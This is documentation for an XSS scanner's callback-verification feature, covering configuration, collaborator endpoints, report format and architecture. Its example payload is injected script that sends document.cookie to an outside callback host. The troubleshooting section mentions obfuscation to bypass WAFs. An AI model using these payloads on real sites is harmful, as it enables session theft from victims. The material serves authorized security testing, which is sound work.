# XSS Callback Verification System

## Overview

The Megido XSS scanner now includes **callback-based verification** to reduce false positives and provide proof of actual JavaScript execution in the target's browser context. This feature is essential for:

- **Accurate Bug Reporting**: Only report XSS vulnerabilities that are demonstrably exploitable
- **Responsible Disclosure**: Provide concrete evidence of exploitation
- **Bug Bounty Submissions**: Meet the evidence requirements for bounty programs
- **Reduced False Positives**: Don't report XSS based on DOM sinks or console errors alone

## How It Works

### Traditional XSS Detection (Legacy)

Previously, the scanner detected XSS by:
1. Injecting payloads with `alert()` dialogs
2. Checking for console errors
3. Looking for DOM sinks

**Problem**: These methods can produce false positives and don't prove actual exploitability.

### Callback-Based Verification (New)

The new system:
1. **Generates callback payloads** that make HTTP requests to a verification endpoint
2. **Injects payloads** into target parameters/fields
3. **Waits for callback** from the target's browser
4. **Verifies execution** by checking if the callback was received
5. **Only reports SUCCESS** if callback is confirmed

### Payload Example

Instead of:
```html
<script>alert(1)</script>
```

The scanner injects:
```html
<script>
(function(){
    try{
        var x=new XMLHttpRequest();
        x.open('GET','https://callback.megido.com/abc123?data='+encodeURIComponent(document.cookie),true);
        x.send();
    }catch(e){}
    try{
        fetch('https://callback.megido.com/abc123?data='+encodeURIComponent(document.cookie));
    }catch(e){}
})();
</script>
```

When this JavaScript executes in the target's browser:
- It makes an HTTP request to the callback endpoint
- The unique ID (`abc123`) identifies the payload
- The scanner verifies the callback was received
- Only then is the XSS marked as **VERIFIED/SUCCESS**

## Configuration

### Environment Variables

Add to your `.env` file:

```bash
# Callback endpoint URL (required for external services)
XSS_CALLBACK_ENDPOINT=https://your-callback-endpoint.com

# Timeout for waiting for callback (seconds)
XSS_CALLBACK_TIMEOUT=30

# Enable/disable callback verification
XSS_CALLBACK_VERIFICATION_ENABLED=true

# Poll interval for checking callbacks (seconds)
XSS_CALLBACK_POLL_INTERVAL=2

# Use internal Megido collaborator (if no external endpoint)
XSS_USE_INTERNAL_COLLABORATOR=true
```

### Django Settings

Settings are automatically loaded from environment variables. See `megido_security/settings.py`:

```python
# XSS Callback Verification Configuration
XSS_CALLBACK_ENDPOINT = os.environ.get('XSS_CALLBACK_ENDPOINT', '')
XSS_CALLBACK_TIMEOUT = int(os.environ.get('XSS_CALLBACK_TIMEOUT', '30'))
XSS_CALLBACK_VERIFICATION_ENABLED = os.environ.get('XSS_CALLBACK_VERIFICATION_ENABLED', 'true').lower() == 'true'
XSS_CALLBACK_POLL_INTERVAL = int(os.environ.get('XSS_CALLBACK_POLL_INTERVAL', '2'))
XSS_USE_INTERNAL_COLLABORATOR = os.environ.get('XSS_USE_INTERNAL_COLLABORATOR', 'true').lower() == 'true'
```

### Plugin Configuration

You can also configure callback verification per-scan:

```python
from scanner.plugins import get_registry

plugin = get_registry().get_plugin('xss')

result = plugin.execute_attack(
    target_url='http://example.com/search',
    vulnerability_data={'parameter': 'q', 'method': 'GET'},
    config={
        'callback_verification_enabled': True,
        'callback_endpoint': 'https://your-callback.com',
        'callback_timeout': 30,
        'use_internal_collaborator': False,
        # ... other config ...
    }
)
```

## Callback Endpoints

### Supported Services

#### 1. Burp Collaborator

Burp Suite Professional includes Collaborator for out-of-band detection:

```bash
# Get your Burp Collaborator domain
# In Burp Suite: Burp > Burp Collaborator client

XSS_CALLBACK_ENDPOINT=https://your-subdomain.burpcollaborator.net
```

**Pros**: Professional, reliable, integrated with Burp Suite  
**Cons**: Requires Burp Suite Professional license

#### 2. Interactsh

Open-source alternative to Burp Collaborator:

```bash
# Use public Interactsh server
XSS_CALLBACK_ENDPOINT=https://your-id.interact.sh

# Or self-host: https://github.com/projectdiscovery/interactsh
```

**Pros**: Free, open-source, self-hostable  
**Cons**: Requires external service or self-hosting

#### 3. Internal Megido Collaborator

Megido includes a built-in collaborator server:

```bash
# Enable internal collaborator
XSS_USE_INTERNAL_COLLABORATOR=true
# Leave XSS_CALLBACK_ENDPOINT empty or point to your Megido instance
XSS_CALLBACK_ENDPOINT=http://localhost:8000/collaborator/callback
```

**Pros**: No external dependencies, integrated  
**Cons**: Target must be able to reach your Megido instance

#### 4. Custom Webhook

Any HTTP endpoint that logs requests:

```bash
XSS_CALLBACK_ENDPOINT=https://webhook.site/your-unique-id
# Or use RequestBin, Pipedream, etc.
```

**Pros**: Flexible, many free options  
**Cons**: Manual verification, not automated

## Usage Examples

### Basic Scan with Callback Verification

```python
from scanner.plugins import get_registry

# Get XSS plugin
plugin = get_registry().get_plugin('xss')

# Run scan with callback verification
result = plugin.execute_attack(
    target_url='http://vulnerable-site.com/search',
    vulnerability_data={
        'parameter': 'q',
        'method': 'GET'
    },
    config={
        'callback_verification_enabled': True,
        'callback_timeout': 30,
        'enable_dom_testing': True,
        'collect_evidence': True
    }
)

# Check results
if result['success']:
    print(f"✓ Found {len(result['findings'])} VERIFIED XSS vulnerabilities")
    for finding in result['findings']:
        print(f"  - {finding['url']}")
        print(f"    Payload ID: {finding.get('payload_id')}")
        print(f"    Callbacks: {len(finding.get('callback_interactions', []))}")
else:
    print("✗ No verified XSS vulnerabilities found")
```

### Command-Line Usage (if CLI tool exists)

```bash
# Scan with callback verification
python scanner_cli.py xss --url http://example.com/search?q=test \
    --callback-endpoint https://your-callback.com \
    --callback-timeout 30 \
    --enable-callback-verification

# Scan with internal collaborator
python scanner_cli.py xss --url http://example.com/search?q=test \
    --use-internal-collaborator \
    --callback-timeout 30
```

### Disabling Callback Verification

To use traditional alert-based detection:

```python
result = plugin.execute_attack(
    target_url='http://example.com',
    vulnerability_data={'parameter': 'q'},
    config={
        'callback_verification_enabled': False,  # Disable callbacks
        'enable_dom_testing': True,
    }
)
```

Or via environment variable:

```bash
XSS_CALLBACK_VERIFICATION_ENABLED=false
```

## Report Format

### Verified Finding Example

When a callback is received, the report includes:

```
### Finding #1 - DOM XSS

✓ VERIFIED - Real Impact Proven

- URL: http://example.com/search?q=<payload>
- Parameter: q
- Method: GET
- Context: dom
- Severity: HIGH
- Verification Method: callback
- Evidence: ✓ VERIFIED: XSS callback received from 2 source(s)

Payload:
<script>(function(){try{var x=new XMLHttpRequest();x.open('GET','...')...</script>

#### 📡 Callback Verification Details

Payload ID: abc123def456
Callback Interactions: 2

Interaction #1:
- Timestamp: 2026-02-13T10:30:45.123456
- Source IP: 203.0.113.42
- HTTP Method: GET
- HTTP Path: /callback/abc123def456?data=session%3D...

Interaction #2:
- Timestamp: 2026-02-13T10:30:45.234567
- Source IP: 203.0.113.42
- HTTP Method: GET
- HTTP Path: /callback/abc123def456?method=fetch

#### 🔍 Proof of Impact (Verified Vulnerability)

✓ VERIFIED XSS - Callback confirmed JavaScript execution

Payload ID: abc123def456
Callback Interactions: 2

Callback #1:
  Timestamp: 2026-02-13T10:30:45.123456
  Source IP: 203.0.113.42
  Method: GET
  Path: /callback/abc123def456?data=session%3D...

Extracted Data:
- Cookies: 3 cookie(s) accessible
- Document Domain: example.com

Actions Performed:
- HTTP callback via XMLHttpRequest
- HTTP callback via Fetch API

#### 💼 Business/Security Impact

This vulnerability allows an attacker to execute arbitrary JavaScript in the 
victim's browser context, potentially leading to:
- Session hijacking (3 cookies accessible)
- Account takeover
- Data theft
- Phishing attacks
...
```

### Unverified Findings

If callback verification is enabled but no callback is received, **no finding is reported**. This eliminates false positives from:
- Payloads reflected but not executed
- DOM sinks without actual execution
- Console errors without exploitability

## Architecture

### Components

1. **XSSCallbackVerifier** (`scanner/plugins/xss_callback_verifier.py`)
   - Generates callback payloads with unique IDs
   - Tracks pending verifications
   - Polls for callback interactions
   - Generates verification reports

2. **XSSPlugin** (`scanner/plugins/exploits/xss_plugin.py`)
   - Integrates callback verifier
   - Modified DOM testing to use callbacks
   - Reports only verified findings
   - Includes callback data in reports

3. **Collaborator Models** (`collaborator/models.py`)
   - `CollaboratorServer`: Stores callback endpoints
   - `Interaction`: Logs HTTP callbacks

4. **Settings** (`megido_security/settings.py`)
   - Configuration constants
   - Environment variable loading

### Flow Diagram

```
┌──────────────┐
│ XSS Plugin   │
└──────┬───────┘
       │
       ├─ Initialize CallbackVerifier
       │  (with endpoint from config/settings)
       │
       ├─ Generate callback payload with unique ID
       │  "abc123": <script>fetch('callback/abc123')...</script>
       │
       ├─ Inject payload into target
       │  http://target.com/search?q=<payload>
       │
       ├─ Target browser executes JavaScript
       │  └─> Makes HTTP request to callback endpoint
       │      GET /callback/abc123
       │
       ├─ CallbackVerifier polls for interactions
       │  (every 2 seconds for up to 30 seconds)
       │
       ├─ Check collaborator database/API
       │  └─> Found interaction: ID abc123, IP 203.0.113.42
       │
       ├─ Verify callback received
       │  ✓ Verified!
       │
       └─ Report finding as VERIFIED/SUCCESS
          with callback details, timestamp, etc.
```

## Troubleshooting

### No Callbacks Received

**Issue**: Scan completes but no verified findings

**Possible Causes**:
1. **Target can't reach callback endpoint**
   - Check firewall rules
   - Ensure endpoint is publicly accessible
   - Try using internal collaborator for local testing

2. **Payload blocked by WAF/XSS filter**
   - Try different payload encodings
   - Use obfuscation techniques
   - Check target's CSP headers

3. **JavaScript execution blocked**
   - Check browser console for errors
   - Verify payload context is correct
   - Ensure no Content Security Policy blocking

4. **Callback endpoint not working**
   - Test endpoint manually: `curl https://your-callback.com/test`
   - Check collaborator server logs
   - Verify Django server is running (for internal collaborator)

### False Positives Still Occurring

**Issue**: Getting verified findings for non-exploitable XSS

**Solution**:
- Increase `callback_timeout` to ensure adequate wait time
- Check if callbacks are from scanner itself (IP address verification)
- Review callback payload generation logic

### Slow Scans

**Issue**: Scans take too long with callback verification

**Solution**:
- Reduce `callback_timeout` (default: 30s per payload)
- Reduce `crawl_depth` and `max_pages`
- Disable callback verification for quick scans: `callback_verification_enabled=false`
- Use parallel scanning if available

## Security Considerations

### Callback Endpoint Security

- **Use HTTPS**: Ensure callback endpoint uses HTTPS to protect data in transit
- **Validate Payloads**: Don't trust data in callbacks (could be from attackers)
- **Rate Limiting**: Implement rate limiting on callback endpoints
- **Authentication**: Consider API authentication for callback endpoints

### Privacy

- **Data Leakage**: Callback payloads may extract cookies/localStorage
- **IP Logging**: Callback interactions log source IP addresses
- **Target Notification**: Callbacks may alert target to scanning activity

### Responsible Use

- **Authorization**: Only scan targets you have permission to test
- **Disclosure**: Report verified XSS to responsible parties
- **Evidence Handling**: Securely store and transmit verification evidence

## API Reference

### XSSCallbackVerifier

```python
from scanner.plugins.xss_callback_verifier import XSSCallbackVerifier

verifier = XSSCallbackVerifier(
    callback_endpoint='https://callback.com',
    timeout=30,
    poll_interval=2,
    use_internal_collaborator=True
)

# Generate callback payload
payload, payload_id = verifier.generate_callback_payload(
    base_payload='<script>CALLBACK</script>',
    context='html'
)

# Verify callback
is_verified, interactions = verifier.verify_callback(payload_id, wait=True)

if is_verified:
    print(f"✓ Verified with {len(interactions)} interaction(s)")
    for interaction in interactions:
        print(f"  {interaction['timestamp']}: {interaction['source_ip']}")
```

### get_default_callback_payloads()

```python
from scanner.plugins.xss_callback_verifier import get_default_callback_payloads

payloads = get_default_callback_payloads()
# Returns list of payload templates with 'CALLBACK' placeholder
# e.g., ['<script>CALLBACK</script>', '<img src=x onerror="CALLBACK">', ...]
```

## Contributing

To extend the callback verification system:

1. **Add New Callback Endpoints**: Implement provider-specific API clients
2. **Improve Payloads**: Add more callback payload variants
3. **Enhance Verification**: Add additional verification methods (DNS, SMTP, etc.)
4. **Better Reporting**: Enhance report formats with more details

## References

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [Burp Collaborator Documentation](https://portswigger.net/burp/documentation/collaborator)
- [Interactsh Project](https://github.com/projectdiscovery/interactsh)
- [Bug Bounty Best Practices](https://www.bugcrowd.com/resources/)

## License

This feature is part of the Megido Security Platform and follows the project's license.
